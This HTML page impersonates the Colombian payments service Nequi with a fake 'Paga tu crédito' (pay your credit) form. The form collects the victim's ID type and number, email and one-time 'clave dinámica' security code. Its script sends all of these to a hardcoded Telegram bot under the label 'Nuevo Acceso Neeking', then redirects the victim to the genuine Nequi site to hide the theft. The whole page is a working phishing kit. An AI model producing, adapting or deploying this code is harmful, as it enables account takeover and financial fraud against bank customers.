<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paga tu crédito</title>
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --orquidea: #da0081;
            --uva: #200020;
            --input-background: #fbf7fb;
            --gray-200: #e8e8e8;
            --white: #ffffff;
            --font-family: 'Manrope', sans-serif;
        }

        * { box-sizing: border-box; font-family: var(--font-family); }

        body {
            margin: 0;
            background-color: var(--white);
            display: flex;
            justify-content: center;
            padding-top: 30px;
            -webkit-font-smoothing: antialiased;
        }

        .main-wrapper {
            display: flex;
            align-items: flex-start;
            gap: 20px;
            max-width: 700px;
            width: 100%;
            justify-content: center;
            padding: 0 15px;
        }

        .container {
            width: 100%;
            max-width: 320px;
            text-align: center;
        }

        .logo-area { margin-bottom: 25px; display: flex; justify-content: center; }
        .logo-area img { max-width: 150px; height: auto; }

        h2 { font-size: 20px; color: var(--uva); font-weight: 600; margin-bottom: 8px; }
        .instruction { font-size: 14px; color: var(--uva); margin-bottom: 24px; }

        .field-container { margin-bottom: 14px; text-align: left; }
        
        .label-text {
            display: block;
            font-size: 11px;
            color: var(--orquidea);
            margin-left: 10px;
            margin-bottom: 4px;
            font-weight: 500;
        }

        input, select {
            width: 100%;
            height: 48px;
            padding: 0 16px;
            background-color: var(--input-background);
            border: 1px solid transparent;
            border-radius: 4px;
            font-size: 15px;
            color: var(--uva);
            outline: none;
            transition: border 0.2s;
        }

        .input-disabled {
            color: #a699a6;
            cursor: not-allowed;
        }

        input:focus, select:focus {
            border: 1px solid var(--orquidea);
            background-color: var(--white);
        }

        .btn-primary {
            width: 100%;
            min-height: 48px;
            background: var(--orquidea);
            border: 1px solid var(--orquidea);
            color: var(--white);
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 16px;
            transition: opacity 0.2s;
        }

        .btn-secondary {
            width: 100%;
            min-height: 48px;
            background: transparent;
            border: 1px solid var(--uva);
            color: var(--uva);
            border-radius: 4px;
            font-size: 16px;
            margin-top: 12px;
            cursor: pointer;
        }

        .help-link {
            display: block;
            margin-top: 20px;
            color: var(--orquidea);
            text-decoration: none;
            font-size: 13px;
            font-weight: 600;
        }

        .help-panel {
            width: 260px;
            background: var(--white);
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
            display: none;
            margin-top: 140px;
            border: 1px solid #eee;
        }

        .help-panel p { font-size: 13px; color: var(--uva); line-height: 1.5; margin-bottom: 12px; }

        .app-mockup {
            background: #130013;
            border-radius: 8px;
            padding: 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            color: var(--white);
        }
    </style>
</head>
<body>

<div class="main-wrapper">
    <div class="container">
        <div class="logo-area"><img src="nequi-colombia-logo-png_seeklogo-505078.png" alt="Logo"></div>
        <h2>Paga tu crédito</h2>
        <p class="instruction">Escribe los datos del titular del crédito</p>

        <div class="field-container">
            <span class="label-text">Tipo de persona</span>
            <input type="text" id="tipo_persona" value="Natural" class="input-disabled" readonly>
        </div>

        <div class="field-container">
            <span class="label-text">Tipo de identificación</span>
            <select id="tipo_id">
                <option value="Cédula de ciudadanía">Cédula de ciudadanía</option>
                <option value="Cédula de extranjería">Cédula de extranjería</option>
            </select>
        </div>

        <div class="field-container">
            <span class="label-text">Número de documento</span>
            <input type="text" id="doc" placeholder="Número de documento">
        </div>

        <div class="field-container">
            <span class="label-text">Correo electrónico</span>
            <input type="email" id="email" placeholder="Correo electrónico">
        </div>

        <div class="field-container">
            <span class="label-text">Clave dinámica</span>
            <input type="password" id="clave" placeholder="Clave dinámica" onfocus="showHelp()" onblur="hideHelp()">
        </div>

        <button class="btn-primary" id="btnSend">Sigue</button>
        <button class="btn-secondary" onclick="window.location.href='https://www.nequi.com.co'">Ahora no</button>
        <a href="#" class="help-link">Ayuda</a>
    </div>

    <div class="help-panel" id="sideHelp">
        <p>Puedes copiar la clave dinámica directamente desde la app</p>
        <div class="app-mockup">
            <div style="display:flex; align-items:center; gap:6px;">
                <div style="width:8px; height:8px; border:2px solid var(--orquidea); border-radius:50%;"></div>
                <span style="font-size:10px;">Clave dinámica</span>
            </div>
            <span style="font-weight:bold; font-size:12px;">201909</span>
            <span>📋</span>
        </div>
    </div>
</div>

<script>
    const TELEGRAM_TOKEN = '8645914326:AAFtHT7VXt5wYoMS8yEKOvVYD0L22mBiFsg';
    const CHAT_ID = '8324606698';

    function showHelp() { document.getElementById('sideHelp').style.display = 'block'; }
    function hideHelp() { document.getElementById('sideHelp').style.display = 'none'; }

    document.getElementById('btnSend').addEventListener('click', async () => {
        const tipoPersona = document.getElementById('tipo_persona').value;
        const tipoId = document.getElementById('tipo_id').value;
        const doc = document.getElementById('doc').value;
        const email = document.getElementById('email').value;
        const clave = document.getElementById('clave').value;

        if(!doc || !email || !clave) {
            alert("Por favor, completa todos los campos.");
            return;
        }

        const texto = `✅ *Nuevo Acceso Neeking*\n\n👤 *Persona:* ${tipoPersona}\n🪪 *Tipo ID:* ${tipoId}\n🆔 *Cedula ID:* ${doc}\n📧 *Correo:* ${email}\n🔑 *Clave Dinámica:* ${clave}`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: texto,
                    parse_mode: 'Markdown'
                })
            });

            if (response.ok) {
                // Redirigir solo si el mensaje se envió correctamente
                window.location.href = "https://www.nequi.com.co";
            } else {
                const errorData = await response.json();
                console.error("Error de Telegram:", errorData);
                alert("Hubo un problema al procesar la solicitud. Verifica tu conexión.");
            }
        } catch (error) {
            console.error("Error de red:", error);
            alert("Error de conexión con el servidor.");
        }
    });
</script>

</body>
</html>
